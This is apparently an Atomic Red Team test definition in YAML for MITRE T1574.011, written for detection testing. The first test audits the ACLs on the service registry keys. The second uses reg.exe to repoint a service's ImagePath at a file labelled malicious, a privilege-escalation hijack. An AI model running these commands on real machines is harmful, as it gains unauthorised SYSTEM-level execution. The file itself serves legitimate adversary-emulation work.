atomic_tests:
- auto_generated_guid: f7536d63-7fd4-466f-89da-7e48d550752a
  description: 'Service registry permissions weakness check and then which can lead
    to privilege escalation with ImagePath. eg.

    reg add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}" /v ImagePath
    /d "C:\temp\AtomicRedteam.exe"

    '
  executor:
    command: 'get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL

      get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}
      |FL

      '
    name: powershell
  input_arguments:
    weak_service_name:
      default: browser
      description: weak service check
      type: string
  name: Service Registry Permissions Weakness
  supported_platforms:
  - windows
- auto_generated_guid: f38e9eea-e1d7-4ba6-b716-584791963827
  dependencies:
  - description: 'The service must exist (#{weak_service_name})

      '
    get_prereq_command: 'sc.exe create #{weak_service_name} binpath= "#{weak_service_path}"

      '
    prereq_command: 'if (Get-Service #{weak_service_name}) {exit 0} else {exit 1}

      '
  dependency_executor_name: powershell
  description: 'Change Service registry ImagePath of a bengin service to a malicious
    file

    '
  executor:
    cleanup_command: 'sc.exe delete #{weak_service_name}

      '
    command: 'reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name}"
      /f /v ImagePath /d "#{malicious_service_path}"

      '
    name: command_prompt
  input_arguments:
    malicious_service_path:
      default: C:\Users\anis\Desktop\rs.exe
      description: malicious service path
      type: string
    weak_service_name:
      default: Appinfo
      description: weak service name
      type: string
    weak_service_path:
      default: '%windir%\system32\win32calc.exe'
      description: weak service path
      type: string
  name: Service ImagePath Change with reg.exe
  supported_platforms:
  - windows
attack_technique: T1574.011
display_name: 'Hijack Execution Flow: Services Registry Permissions Weakness'
